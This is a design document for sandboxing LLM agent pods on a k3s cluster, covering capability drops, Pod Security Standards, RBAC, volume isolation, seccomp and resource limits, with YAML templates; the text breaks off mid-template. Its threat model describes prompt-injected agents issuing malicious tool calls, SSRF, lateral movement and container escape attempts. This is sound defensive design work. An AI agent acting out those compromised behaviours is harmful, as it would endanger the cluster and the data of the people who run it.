# Spike #33 — Agent Pods: Security Model & Resource Limits

**Status:** Proposed
**Date:** 2026-02-24
**Author:** Cortex Plane Team
**Depends on:** [Spike #25 — Agent Registry & Session Mapping](./025-agent-registry-session-mapping.md), [Spike #27 — Project Structure & Tooling](./027-project-structure.md), [Spike #28 — Graphile Retry, Timeout & Shutdown Patterns](./028-graphile-patterns.md), [Spike #30 — Qdrant Deployment Topology](./030-qdrant-deployment.md)

---

## Table of Contents

1. [Context](#context)
2. [Question 1: Linux Capabilities — Drop All, Add Back What?](#question-1-linux-capabilities--drop-all-add-back-what)
3. [Question 2: Pod Security Standards — Restricted vs Baseline](#question-2-pod-security-standards--restricted-vs-baseline)
4. [Question 3: Per-Agent ServiceAccount and RBAC](#question-3-per-agent-serviceaccount-and-rbac)
5. [Question 4: SubPath PVC Mounts — Preventing Directory Traversal](#question-4-subpath-pvc-mounts--preventing-directory-traversal)
6. [Question 5: fsGroup Permissions](#question-5-fsgroup-permissions)
7. [Question 6: Seccomp Profile](#question-6-seccomp-profile)
8. [Question 7: Resource Limits Per Container Type](#question-7-resource-limits-per-container-type)
9. [Question 8: QoS Class — Guaranteed vs Burstable](#question-8-qos-class--guaranteed-vs-burstable)
10. [Artifact: Pod Security Standards Configuration](#artifact-pod-security-standards-configuration)
11. [Artifact: ServiceAccount + Role + RoleBinding Templates](#artifact-serviceaccount--role--rolebinding-templates)
12. [Artifact: Resource Request/Limit Matrix](#artifact-resource-requestlimit-matrix)
13. [Artifact: NetworkPolicy Spec](#artifact-networkpolicy-spec)
14. [Artifact: Threat Model — Container Escape Scenarios](#artifact-threat-model--container-escape-scenarios)
15. [Artifact: OOM Handling Strategy for Playwright Containers](#artifact-oom-handling-strategy-for-playwright-containers)
16. [Design Decisions](#design-decisions)
17. [Open Questions](#open-questions)

---

## Context

The control plane spawns agent pods as Kubernetes Jobs (spike #24). Each agent pod runs a task — an LLM call, tool execution, browser automation — and exits. These pods execute untrusted or semi-trusted workloads: they run LLM-generated code, interact with external services, and may invoke Playwright for browser automation. The security boundary between the control plane and agent pods is the primary blast radius containment mechanism.

This spike defines the security posture for agent pods: what they can do, what they cannot do, what resources they consume, and how to contain the damage when something goes wrong.

### Container Types

| Container Type       | Purpose                                               | Image Base                                   | Trust Level                                                 |
| -------------------- | ----------------------------------------------------- | -------------------------------------------- | ----------------------------------------------------------- |
| **Core agent**       | LLM calls, tool orchestration, MCP server interaction | `node:24-slim`                               | Semi-trusted — executes LLM-directed tool calls             |
| **Playwright**       | Browser automation (scraping, form filling, testing)  | `mcr.microsoft.com/playwright:v1.50.0-noble` | Low trust — navigates arbitrary web pages, executes page JS |
| **Sidecar (future)** | Logging, metrics, proxy                               | TBD                                          | Trusted — platform-controlled                               |

### Hard Constraints

| Constraint                                         | Implication                                                                                                  |
| -------------------------------------------------- | ------------------------------------------------------------------------------------------------------------ |
| k3s on ARM64 + x64                                 | Security policies must work on both architectures. k3s uses containerd, not Docker.                          |
| Homelab — limited RAM (32–64 GB total cluster)     | Agent pods cannot over-allocate. Hard limits are mandatory.                                                  |
| Agent pods are ephemeral Jobs                      | Pods run to completion and are garbage-collected. No long-lived state in the pod.                            |
| Control plane spawns pods via k8s API              | The control plane's ServiceAccount needs pod/job creation rights; agent ServiceAccounts need almost nothing. |
| `resource_limits` JSONB in agent table (spike #25) | Per-agent limits are stored in PostgreSQL and applied when the Job manifest is generated.                    |
| Graphile Worker timeout hierarchy (spike #28)      | Job-level timeouts enforce an outer bound; pod `activeDeadlineSeconds` is the last-resort kill.              |

### Threat Model Summary

The adversary model for agent pods:

1. **Compromised LLM output.** The LLM generates malicious tool calls (file access outside sandbox, command injection, SSRF). This is the primary threat — prompt injection is a when, not an if.
2. **Malicious web content.** Playwright navigates to an attacker-controlled page that attempts to exploit browser vulnerabilities or exfiltrate data.
3. **Supply chain attack.** A compromised npm package in the agent image executes arbitrary code at build time or runtime.
4. **Lateral movement.** A compromised agent pod attempts to access other pods, the k8s API server, or the host node.

The security model assumes agent pods **will** be compromised and designs containment accordingly.

---

## Question 1: Linux Capabilities — Drop All, Add Back What?

**Question:** Should we drop ALL capabilities and selectively add back NET_BIND_SERVICE or others?

**Decision:** Drop ALL. Add back nothing.

### Options Evaluated

| Capability                                            | Need?              | Rationale                                                                                                                                               |
| ----------------------------------------------------- | ------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `NET_BIND_SERVICE`                                    | **No**             | Agent pods don't bind to privileged ports (<1024). They make outbound HTTP requests; they don't listen.                                                 |
| `NET_RAW`                                             | **No**             | No need for raw sockets, ICMP, or packet sniffing.                                                                                                      |
| `SYS_PTRACE`                                          | **No**             | No debugging of other processes. Playwright uses its own IPC, not ptrace.                                                                               |
| `CHOWN`, `DAC_OVERRIDE`, `FOWNER`, `SETUID`, `SETGID` | **No**             | Pods run as non-root with a fixed UID/GID. No file ownership changes needed.                                                                            |
| `SYS_ADMIN`                                           | **Absolutely not** | This is the "do anything" capability. Dropping it prevents mount namespace manipulation, cgroup escape, BPF loading, and most container escape vectors. |
| `MKNOD`                                               | **No**             | No device file creation.                                                                                                                                |

### Rationale

Agent pods are ephemeral compute units. They:

- Make outbound HTTPS requests to LLM APIs and MCP servers.
- Read/write to a single mounted volume (workspace subpath).
- Execute Node.js code and (optionally) Playwright browsers.

None of these operations require any Linux capability. The default Docker/containerd capability set includes 14 capabilities that are unnecessary for our workload. Dropping ALL and adding none is the most restrictive posture and the correct baseline.

**Playwright note:** Chromium in Playwright runs without `--no-sandbox` when the container has `SYS_ADMIN`. However, the correct approach is to run Chromium with `--no-sandbox` inside an already-sandboxed container (capabilities dropped, seccomp active, non-root user). The kernel-level sandbox (seccomp + namespace isolation) replaces Chromium's user-space sandbox. The Playwright Docker image is designed for this — it sets `--no-sandbox` by default when running as non-root.

### Configuration

```yaml
securityContext:
  capabilities:
    drop:
      - ALL
```

This is applied at the container level in every agent pod template.

---

## Question 2: Pod Security Standards — Restricted vs Baseline

**Question:** Which Pod Security Standard level should we enforce for the `cortex` namespace?

**Decision:** `restricted` level for the `cortex` namespace, with targeted exemptions for Playwright pods only.

### Pod Security Standards Overview

Kubernetes defines three Pod Security Standards levels:

| Level          | What It Enforces                                                                                                                                                                       |
| -------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Privileged** | Nothing. Anything goes.                                                                                                                                                                |
| **Baseline**   | Blocks known privilege escalations: hostNetwork, hostPID, privileged containers, hostPath volumes. Allows most capabilities.                                                           |
| **Restricted** | Everything in baseline, plus: must run as non-root, must drop ALL capabilities, read-only root filesystem, no privilege escalation, seccomp profile required, restricted volume types. |

### Options Evaluated

| Criterion                           | Baseline | Restricted                                   |
| ----------------------------------- | -------- | -------------------------------------------- |
| Protection against known escalation | Yes      | Yes                                          |
| Enforces non-root                   | No       | Yes                                          |
| Enforces capability drop            | No       | Yes                                          |
| Enforces seccomp                    | No       | Yes                                          |
| Enforces read-only root filesystem  | No       | Yes                                          |
| Compatibility with core agent       | Full     | Full — already designed for this             |
| Compatibility with Playwright       | Full     | **Needs /tmp writable** — use emptyDir mount |
| Operational overhead                | Low      | Low — one-time pod spec adjustments          |

### Rationale

1. **Restricted is the right default for untrusted workloads.** Agent pods execute LLM-directed code. This is the definition of a workload that should have minimal privileges. Baseline allows too much — it permits running as root, keeping capabilities, and skipping seccomp.

2. **Our pods already comply.** Spike #30's Qdrant deployment already uses the restricted pattern: `runAsNonRoot: true`, `capabilities.drop: [ALL]`, `readOnlyRootFilesystem: true`, `allowPrivilegeEscalation: false`. We apply the same pattern to agent pods.

3. **Playwright needs one accommodation.** Chromium writes to `/tmp` for profile data, crash dumps, and shared memory. With `readOnlyRootFilesystem: true`, we mount an `emptyDir` at `/tmp` and `/dev/shm`. This satisfies the restricted standard while giving Chromium the writable paths it needs.

### Enforcement

Pod Security Standards are enforced via namespace labels (built into Kubernetes since v1.25, available in k3s):

```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: cortex
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
```

All three modes (`enforce`, `audit`, `warn`) are set to `restricted`. This means:

- **enforce:** Pods that violate `restricted` are rejected at admission.
- **audit:** Violations are logged to the API server audit log.
- **warn:** kubectl users see warnings when creating non-compliant pods.

No version pinning — we use `latest` (the default) so that enforcement tracks the cluster's Kubernetes version.

---

## Question 3: Per-Agent ServiceAccount and RBAC

**Question:** What ServiceAccount and RBAC permissions does each agent pod need?

**Decision:** One shared ServiceAccount (`agent-runner`) for all agent pods, with zero Kubernetes API permissions. The control plane uses a separate ServiceAccount (`control-plane`) with scoped RBAC.

### Why Not Per-Agent ServiceAccounts?

Per-agent ServiceAccounts (one per agent definition in the registry) was considered but rejected:

| Criterion            | Per-Agent SA                                         | Shared SA                                                                                        |
| -------------------- | ---------------------------------------------------- | ------------------------------------------------------------------------------------------------ |
| RBAC granularity     | Each agent gets its own Role                         | All agents share one Role                                                                        |
| Operational overhead | Create/delete SA on agent CRUD                       | One SA, managed once                                                                             |
| Token rotation       | N tokens to rotate                                   | 1 token to rotate                                                                                |
| Audit trail          | API audit log shows which agent's SA made a call     | API audit log shows `agent-runner` (agent identity tracked in control plane logs, not k8s audit) |
| Blast radius         | Compromised SA only affects that agent's permissions | Compromised SA affects all agents — but SA has zero permissions anyway                           |

**The key insight: agent pods don't need Kubernetes API access.** They don't list pods, read secrets, create configmaps, or interact with the k8s API at all. They:

- Call external APIs (LLM providers, MCP servers) via HTTPS.
- Read/write their workspace volume.
- Connect to PostgreSQL and Qdrant via TCP.

A ServiceAccount with zero RBAC permissions and `automountServiceAccountToken: false` is equivalent to having no ServiceAccount at all — the pod has no credentials to access the k8s API. In this configuration, per-agent ServiceAccounts provide zero additional security benefit over a shared one.

**If future agents need k8s API access** (e.g., a DevOps agent that deploys to the same cluster), per-agent ServiceAccounts become necessary. At that point, create a dedicated SA with a minimal Role scoped to the agent's specific needs. This is a future extension, not the day-one design.

### Agent Pod ServiceAccount

```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: agent-runner
  namespace: cortex
  labels:
    app.kubernetes.io/component: agent
    app.kubernetes.io/part-of: cortex-plane
automountServiceAccountToken: false
```

`automountServiceAccountToken: false` prevents the SA token from being mounted into the pod at `/var/run/secrets/kubernetes.io/serviceaccount/token`. This eliminates the most common container escape vector — using the SA token to query the k8s API server.

### Control Plane ServiceAccount

The control plane needs to create and manage agent Jobs:

```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: control-plane
  namespace: cortex
  labels:
    app.kubernetes.io/component: control-plane
    app.kubernetes.io/part-of: cortex-plane
```

With a Role scoped to Job and Pod management:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: control-plane-role
  namespace: cortex
rules:
  # Create and manage agent Jobs
  - apiGroups: ["batch"]
    resources: ["jobs"]
    verbs: ["create", "get", "list", "watch", "delete"]
  # Read pod status and logs for agent monitoring
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["get", "list", "watch"]
  - apiGroups: [""]
    resources: ["pods/log"]
    verbs: ["get"]
  # Read secrets for agent-specific credentials (MCP tokens, API keys)
  - apiGroups: [""]
    resources: ["secrets"]
    verbs: ["get"]
    resourceNames: [] # Populated per-agent; see Design Decision #3
```

The `secrets` rule uses `resourceNames` to restrict which secrets the control plane can read. Each agent's secrets are named predictably (e.g., `agent-devops-agent-secrets`) and the Role is updated when agents are registered. This prevents the control plane from reading arbitrary secrets in the namespace.

### Secret Injection Pattern

Agent pods receive credentials via environment variables sourced from Kubernetes Secrets, not from the k8s API at runtime:

```yaml
env:
  - name: ANTHROPIC_API_KEY
    valueFrom:
      secretKeyRef:
        name: agent-devops-agent-secrets
        key: ANTHROPIC_API_KEY
  - name: MCP_GITHUB_TOKEN
    valueFrom:
      secretKeyRef:
        name: agent-devops-agent-secrets
        key: MCP_GITHUB_TOKEN
        optional: true
```

The control plane reads the secret names from the agent registry (`skill_config` JSONB field in the `agent` table) and injects them into the Job manifest at creation time. The agent pod never has credentials to read secrets from the k8s API — it only sees the values in its environment.

---

## Question 4: SubPath PVC Mounts — Preventing Directory Traversal

**Question:** How do we prevent an agent pod from traversing outside its designated workspace directory on a shared PVC?

**Decision:** Use `subPath` with a sanitized, agent-scoped directory name. Combine with read-only root filesystem, non-root user, and PVC-level fsGroup enforcement.

### The Problem

Agent pods need a writable workspace for temporary files: downloaded documents, generated code, tool outputs. If all agents share a single PVC, a compromised agent could:

1. **Read other agents' data** by traversing `../other-agent/`.
2. **Write to other agents' workspace** to poison their data.
3. **Symlink escape** — create a symlink pointing outside the subpath, then read/write through it.

### Defense-in-Depth Strategy

| Layer                            | Mechanism                                                                                                  | Protects Against                                                                                    |
| -------------------------------- | ---------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------- |
| **1. subPath mount**             | Kubernetes mounts only the specified subdirectory into the pod. The pod cannot see the parent directory.   | Direct `../` traversal via filesystem paths.                                                        |
| **2. Non-root user**             | Pod runs as UID 10000, GID 10000. Cannot `chown` or override file permissions.                             | Privilege escalation to access other users' files.                                                  |
| **3. fsGroup**                   | All files on the PVC are owned by GID 10000. Agent processes run with this GID. No other GID is available. | Cross-agent file access (all agents use the same GID, but subPath prevents cross-directory access). |
| **4. Read-only root filesystem** | The only writable locations are the workspace subpath mount and emptyDir volumes (`/tmp`).                 | Writing to arbitrary container filesystem locations.                                                |
| **5. No `CAP_DAC_OVERRIDE`**     | Capability is dropped. Process cannot bypass file permission checks.                                       | Ignoring file permissions to read/write protected files.                                            |

### SubPath Naming Convention

The subpath directory name is derived from the Job ID (UUIDv7), not the agent slug. This ensures:

- **Uniqueness:** Each job gets its own directory. No two jobs share a workspace.
- **No name collision:** UUIDs cannot collide. Agent slugs could theoretically conflict with directory traversal patterns.
- **Automatic cleanup:** When the Job is deleted (TTL or explicit cleanup), the workspace directory can be garbage-collected by a maintenance task.

```yaml
volumeMounts:
  - name: agent-workspace
    mountPath: /workspace
    subPath: "jobs/019508a7-1c2e-7000-8000-000000000001" # Job UUIDv7
    readOnly: false
```

### Symlink Escape Mitigation

Kubernetes v1.25+ (and k3s) resolves `subPath` values against the volume root at mount time, not at runtime. This means:

- If the `subPath` value contains `..`, the kubelet rejects the mount.
- If the subPath target is a symlink, the kubelet resolves it before mounting and verifies it stays within the volume.
- The `subPathExpr` variant (which interpolates pod fields) is equally safe — the kubelet validates the resolved path.

**However:** The pod process could create a symlink _inside_ the mounted subpath pointing to `../../other-job/`. Since the mount is already scoped to the subpath, this symlink would resolve to a path _outside the mount_, which doesn't exist from the pod's perspective. The kernel enforces that paths within a mount namespace cannot escape the mount point.

### Volume Specification

```yaml
volumes:
  - name: agent-workspace
    persistentVolumeClaim:
      claimName: agent-workspaces
```

The PVC `agent-workspaces` is a shared volume. The control plane creates job-specific subdirectories before spawning agent pods. The subPath mount scopes each pod to its directory.

**Alternative: emptyDir per pod.** For jobs that don't need persistent workspace data (the common case), use an `emptyDir` volume instead of a PVC subpath:

```yaml
volumes:
  - name: workspace
    emptyDir:
      sizeLimit: 500Mi
```

`emptyDir` is inherently isolated — it's created per-pod and destroyed when the pod exits. No subpath or traversal concerns. The `sizeLimit` prevents a runaway process from filling the node's disk (enforced by kubelet's eviction manager on tmpfs-backed emptyDirs, advisory on disk-backed ones).

**Recommendation:** Use `emptyDir` for the default workspace. Reserve PVC subpath mounts for agents that need data persistence across retries (e.g., a code generation agent that checkpoints intermediate results).

---

## Question 5: fsGroup Permissions

**Question:** What GID should agent pods use? How do we enforce it consistently?

**Decision:** GID `10000` for all agent pods. Enforced via pod-level `securityContext.fsGroup` and container-level `runAsGroup`.

### GID Selection

| GID     | Used By            | Notes                                                                                                |
| ------- | ------------------ | ---------------------------------------------------------------------------------------------------- |
| `3000`  | Qdrant (spike #30) | Qdrant's fsGroup in its StatefulSet.                                                                 |
| `10000` | **Agent pods**     | Chosen to avoid conflicts with system GIDs (0–999), common application GIDs (1000–9999), and Qdrant. |

Using a high GID (10000) avoids:

- Collision with the `cortex` user created in the Dockerfile (spike #27), which uses a system-assigned GID.
- Collision with any Qdrant, PostgreSQL, or monitoring pod GIDs.
- Collision with the host system's groups.

### How fsGroup Works

When `fsGroup` is set in the pod's `securityContext`:

1. Kubernetes changes the group ownership of all files in all volumes to the specified GID.
2. Kubernetes sets the setgid bit on volume directories, so new files inherit the GID.
3. The container process's supplementary group list includes the fsGroup GID.

This means: regardless of the UID/GID the container process runs as, it can read/write files on mounted volumes because it has the fsGroup GID in its supplementary groups.

### Configuration

```yaml
spec:
  securityContext:
    runAsUser: 10000
    runAsGroup: 10000
    fsGroup: 10000
    runAsNonRoot: true
    fsGroupChangePolicy: OnRootMismatch # Only re-chown if needed; faster pod startup
  containers:
    - name: agent
      securityContext:
        runAsUser: 10000
        runAsGroup: 10000
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        capabilities:
          drop:
            - ALL
```

### fsGroupChangePolicy

`OnRootMismatch` tells the kubelet to only recursively change volume permissions if the top-level directory's GID doesn't match `fsGroup`. This avoids the performance penalty of re-chowning all files on every pod start — relevant when using PVC subpath mounts with many files.

### Enforcement Across Pod Types

| Pod Type         | UID   | GID   | fsGroup | Notes                                   |
| ---------------- | ----- | ----- | ------- | --------------------------------------- |
| Core agent       | 10000 | 10000 | 10000   | Standard agent user                     |
| Playwright       | 10000 | 10000 | 10000   | Playwright image supports arbitrary UID |
| Sidecar (future) | 10000 | 10000 | 10000   | Same user for volume sharing            |

Using the same UID/GID/fsGroup across all container types within a pod ensures that init containers, main containers, and sidecars can all access shared volumes without permission issues.

---

## Question 6: Seccomp Profile

**Question:** Should agent pods use the default seccomp profile or a custom one?

**Decision:** Use `RuntimeDefault`. No custom profile.

### Options Evaluated

| Criterion                         | RuntimeDefault                                                     | Custom Profile                                                   |
| --------------------------------- | ------------------------------------------------------------------ | ---------------------------------------------------------------- |
| Blocked syscalls                  | ~50 dangerous syscalls (varies by runtime)                         | Any subset of ~300+ syscalls                                     |
| Maintenance                       | Zero — maintained by containerd/CRI-O                              | Must be written, tested, deployed to every node, and updated     |
| Compatibility                     | Works with all container images                                    | Must be tested against every image; one missing syscall = crash  |
| Security value                    | Blocks known escalation syscalls (mount, reboot, kexec, bpf, etc.) | Can additionally block syscalls unused by your specific workload |
| Pod Security Standards compliance | ✅ Satisfies `restricted` level                                    | ✅ Also satisfies `restricted` level                             |
| ARM64 + x64                       | Works on both — runtime provides arch-specific profile             | Custom profiles may need arch-specific syscall numbers           |

### Rationale

1. **RuntimeDefault blocks the dangerous syscalls.** The containerd default seccomp profile blocks `mount`, `reboot`, `kexec_load`, `bpf`, `userfaultfd`, `ptrace` (on non-child processes), and other escalation vectors. This covers the container escape scenarios we care about.

2. **Custom profiles are a maintenance burden.** A custom seccomp profile must enumerate every allowed syscall. When we upgrade Node.js, Playwright, or any dependency, new syscalls may be needed. A custom profile that blocks `io_uring_setup` (used by modern Node.js) would crash the agent on startup with no useful error message. The RuntimeDefault profile is maintained by the container runtime team and tested against common workloads.

3. **The marginal security gain is not worth the complexity.** A custom profile could block, say, `socket(AF_PACKET)` to prevent raw socket creation — but we already drop `NET_RAW` capability, which prevents the same thing at the capability layer. The defense-in-depth layers (capabilities, seccomp, non-root, read-only filesystem) overlap enough that a custom seccomp profile provides negligible additional protection.

4. **ARM64 + x64 complication.** Syscall numbers differ between architectures. While seccomp profiles use syscall names (not numbers) in the JSON format, some tooling and older runtimes resolve names to arch-specific numbers. RuntimeDefault handles this transparently.

### Configuration

```yaml
securityContext:
  seccompProfile:
    type: RuntimeDefault
```

This is set at the pod level and inherited by all containers.

### Future: When to Consider Custom Profiles

Custom seccomp profiles become worthwhile when:

- Running in a multi-tenant cluster where defense-in-depth against novel syscall-based exploits matters.
- Compliance requirements mandate explicit syscall allowlisting (e.g., PCI DSS, SOC 2).
- Threat modeling identifies a specific syscall-based attack vector not covered by RuntimeDefault.

None of these apply to a homelab k3s cluster today.

---

## Question 7: Resource Limits Per Container Type

**Question:** What CPU and memory requests/limits should each container type use?

### Core Agent Container

**Decision:** Request 250m/256Mi, limit 500m/1Gi. Sufficient for LLM streaming and tool orchestration.

| Resource | Request | Limit | Rationale                                                                                                                                                                                                                                                 |
| -------- | ------- | ----- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| CPU      | 250m    | 500m  | Agent work is I/O-bound (waiting for LLM API responses). CPU spikes during JSON parsing and tool output processing are short. 500m limit prevents a runaway process from consuming a full core.                                                           |
| Memory   | 256Mi   | 1Gi   | Node.js base footprint is ~50MB. Agent context (conversation history, tool results) lives in PostgreSQL, not in-memory. 1Gi limit handles large context assembly (100K-token conversations produce ~400KB of JSON) with headroom for dependency overhead. |

**Why 1Gi is enough for large context processing:**

The concern was that assembling large LLM contexts (100K+ tokens) would require more than 1Gi. Analysis:

- 100K tokens ≈ 400KB of text. Even with JSON wrapping, system prompts, and tool definitions, a large context payload is <5MB.
- The LLM response is streamed — the agent processes chunks, not the full response in memory.
- Tool outputs are written to the workspace volume, not held in memory.
- Node.js's V8 heap default is ~1.5GB, but with a 1Gi container limit, the OOM killer fires first. The `--max-old-space-size=768` flag sets V8's heap limit below the container limit, ensuring V8 triggers garbage collection before the OOM killer fires.

**V8 heap configuration:**

```yaml
env:
  - name: NODE_OPTIONS
    value: "--max-old-space-size=768"
```

This gives V8 768MB for the heap, leaving ~256MB for the stack, native code, and OS overhead within the 1Gi container limit. V8 will GC aggressively as it approaches 768MB rather than growing into the OOM kill zone.

### Playwright Container

**Decision:** Request 512Mi/500m, limit 2Gi/1000m. Chromium is memory-hungry; OOM must be handled gracefully.

| Resource | Request | Limit | Rationale                                                                                                                                                                                  |
| -------- | ------- | ----- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| CPU      | 500m    | 1000m | Chromium's rendering engine uses significant CPU for page layout, JS execution, and compositing. 1 core limit is sufficient for single-page interactions (our use case).                   |
| Memory   | 512Mi   | 2Gi   | Chromium + page content + rendered DOM. A typical page with moderate JS uses 200–500MB. Complex SPAs can hit 1GB+. 2Gi is the ceiling — OOM beyond this indicates a page that's too heavy. |

**Why 2Gi, not more:**

- Agent browser tasks are scoped: navigate to a URL, extract data, fill a form, take a screenshot. These are not general-purpose browsing sessions.
- If a page requires >2Gi to render, it's pathological (crypto miners, massive SPAs, memory leak exploits). The OOM kill is the correct response.
- In a 32–64GB cluster, allowing individual Playwright pods to claim more than 2Gi would limit the number of concurrent agent tasks.

**Shared memory requirement:**

Chromium uses `/dev/shm` for inter-process communication between the browser process and renderer processes. The default `/dev/shm` size in Kubernetes is 64MB, which is insufficient. Mount an emptyDir at `/dev/shm`:

```yaml
volumes:
  - name: dshm
    emptyDir:
      medium: Memory
      sizeLimit: 256Mi
```

```yaml
volumeMounts:
  - name: dshm
    mountPath: /dev/shm
```

The `medium: Memory` makes this a tmpfs mount (RAM-backed), which is what Chromium expects. The 256Mi limit is counted against the pod's memory limit.

### Resource Limit Matrix (Summary)

| Container        | CPU Request | CPU Limit | Mem Request | Mem Limit | Workspace Volume                                |
| ---------------- | ----------- | --------- | ----------- | --------- | ----------------------------------------------- |
| Core agent       | 250m        | 500m      | 256Mi       | 1Gi       | emptyDir 500Mi                                  |
| Playwright       | 500m        | 1000m     | 512Mi       | 2Gi       | emptyDir 500Mi + /dev/shm 256Mi + /tmp emptyDir |
| Sidecar (future) | 50m         | 100m      | 64Mi        | 128Mi     | —                                               |

---

## Question 8: QoS Class — Guaranteed vs Burstable

**Question:** Should agent pods use Guaranteed or Burstable QoS?

**Decision:** Burstable for both container types.

### QoS Classes in Kubernetes

| QoS Class      | Definition                                        | Eviction Priority        |
| -------------- | ------------------------------------------------- | ------------------------ |
| **Guaranteed** | requests == limits for every container in the pod | Last to be evicted       |
| **Burstable**  | At least one container has requests < limits      | Evicted after BestEffort |
| **BestEffort** | No requests or limits set                         | First to be evicted      |

### Options Evaluated

| Criterion           | Guaranteed                                       | Burstable                                       |
| ------------------- | ------------------------------------------------ | ----------------------------------------------- |
| Resource efficiency | Poor — reserves peak resources even when idle    | Good — reserves baseline, bursts when available |
| Eviction resistance | Highest — evicted last under memory pressure     | Medium — evicted after BestEffort pods          |
| Cluster utilization | Low — 500m CPU is reserved even during I/O waits | High — 250m reserved, can burst to 500m         |
| Agent pod lifecycle | Agent pods are ephemeral (seconds to minutes)    | Same                                            |
| Our pod mix         | Agents + Qdrant + PostgreSQL + control plane     | Same                                            |

### Rationale

1. **Agent pods are ephemeral.** They run for seconds (simple LLM calls) to minutes (multi-step tool execution). Reserving Guaranteed-level resources for a pod that's mostly waiting for HTTP responses wastes cluster capacity.

2. **The I/O-bound nature.** Core agent pods spend 80%+ of their time waiting for LLM API responses. During this time, they use <50m CPU. Guaranteed QoS would reserve 500m CPU for a pod using 50m — that's 450m wasted that other pods could use.

3. **Eviction is acceptable.** If the cluster is under memory pressure, evicting an agent pod is the correct response. The job will be retried via the Graphile Worker retry hierarchy (spike #28). The control plane and PostgreSQL pods (which should be Guaranteed or have higher priority) must survive; agent pods are expendable.

4. **Cluster fits more agents.** With Burstable QoS, the scheduler uses the request values (250m/256Mi) for scheduling decisions. A node with 4 CPU cores can schedule 16 Burstable agent pods (4000m / 250m) vs. 8 Guaranteed pods (4000m / 500m). At homelab scale, this doubles the concurrency capacity.

### PriorityClass

To further control eviction order, assign agent pods a lower PriorityClass than system components:

```yaml
apiVersion: scheduling.k8s.io/v1
kind: PriorityClass
metadata:
  name: agent-workload
value: 100
globalDefault: false
description: "Priority for ephemeral agent pods. Lower than system components."
```

```yaml
# In agent pod spec
priorityClassName: agent-workload
```

The default system priority is 0, but system-critical pods (coredns, etc.) use priorities ≥1000000000. Control plane pods should use a PriorityClass with value ~1000 to ensure they survive eviction before agent pods.

---

## Artifact: Pod Security Standards Configuration

### Namespace Labels

```yaml
# deploy/cortex/namespace.yaml
apiVersion: v1
kind: Namespace
metadata:
  name: cortex
  labels:
    app.kubernetes.io/part-of: cortex-plane
    # Pod Security Standards — enforce restricted on all pods
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/enforce-version: latest
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/audit-version: latest
    pod-security.kubernetes.io/warn: restricted
    pod-security.kubernetes.io/warn-version: latest
```

### Core Agent Pod Template

```yaml
# Embedded in the Job manifest generated by the control plane
apiVersion: batch/v1
kind: Job
metadata:
  name: agent-${JOB_ID}
  namespace: cortex
  labels:
    app: cortex-agent
    app.kubernetes.io/name: cortex-agent
    app.kubernetes.io/component: agent
    app.kubernetes.io/part-of: cortex-plane
    cortex.plane/agent-slug: ${AGENT_SLUG}
    cortex.plane/job-id: ${JOB_ID}
spec:
  backoffLimit: 0 # No k8s-level retries; retries managed by Graphile Worker (spike #28)
  activeDeadlineSeconds: ${TIMEOUT_SECONDS} # From agent.resource_limits.timeout_seconds
  ttlSecondsAfterFinished: 300 # Cleanup completed Job after 5 minutes
  template:
    metadata:
      labels:
        app: cortex-agent
        app.kubernetes.io/name: cortex-agent
        app.kubernetes.io/component: agent
        cortex.plane/agent-slug: ${AGENT_SLUG}
        cortex.plane/job-id: ${JOB_ID}
    spec:
      serviceAccountName: agent-runner
      automountServiceAccountToken: false
      priorityClassName: agent-workload
      restartPolicy: Never
      securityContext:
        runAsUser: 10000
        runAsGroup: 10000
        fsGroup: 10000
        runAsNonRoot: true
        fsGroupChangePolicy: OnRootMismatch
        seccompProfile:
          type: RuntimeDefault
      containers:
        - name: agent
          image: ghcr.io/noncelogic/cortex-agent:${IMAGE_TAG}
          env:
            - name: NODE_OPTIONS
              value: "--max-old-space-size=768"
            - name: JOB_ID
              value: "${JOB_ID}"
            - name: AGENT_ID
              value: "${AGENT_ID}"
            - name: DATABASE_URL
              valueFrom:
                secretKeyRef:
                  name: cortex-db-credentials
                  key: DATABASE_URL
            - name: QDRANT_URL
              value: "http://qdrant.cortex.svc.cluster.local:6333"
            # Agent-specific secrets injected dynamically
          resources:
            requests:
              cpu: 250m
              memory: 256Mi
            limits:
              cpu: 500m
              memory: 1Gi
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities:
              drop:
                - ALL
          volumeMounts:
            - name: workspace
              mountPath: /workspace
            - name: tmp
              mountPath: /tmp
      volumes:
        - name: workspace
          emptyDir:
            sizeLimit: 500Mi
        - name: tmp
          emptyDir:
            sizeLimit: 100Mi
```

### Playwright Agent Pod Template

```yaml
# Variant for agents with browser automation enabled
spec:
  template:
    spec:
      serviceAccountName: agent-runner
      automountServiceAccountToken: false
      priorityClassName: agent-workload
      restartPolicy: Never
      securityContext:
        runAsUser: 10000
        runAsGroup: 10000
        fsGroup: 10000
        runAsNonRoot: true
        fsGroupChangePolicy: OnRootMismatch
        seccompProfile:
          type: RuntimeDefault
      containers:
        - name: agent
          image: ghcr.io/noncelogic/cortex-agent:${IMAGE_TAG}
          env:
            - name: NODE_OPTIONS
              value: "--max-old-space-size=768"
          resources:
            requests:
              cpu: 250m
              memory: 256Mi
            limits:
              cpu: 500m
              memory: 1Gi
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities:
              drop:
                - ALL
          volumeMounts:
            - name: workspace
              mountPath: /workspace
            - name: tmp
              mountPath: /tmp
        - name: playwright
          image: ghcr.io/noncelogic/cortex-playwright:${IMAGE_TAG}
          resources:
            requests:
              cpu: 500m
              memory: 512Mi
            limits:
              cpu: "1"
              memory: 2Gi
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities:
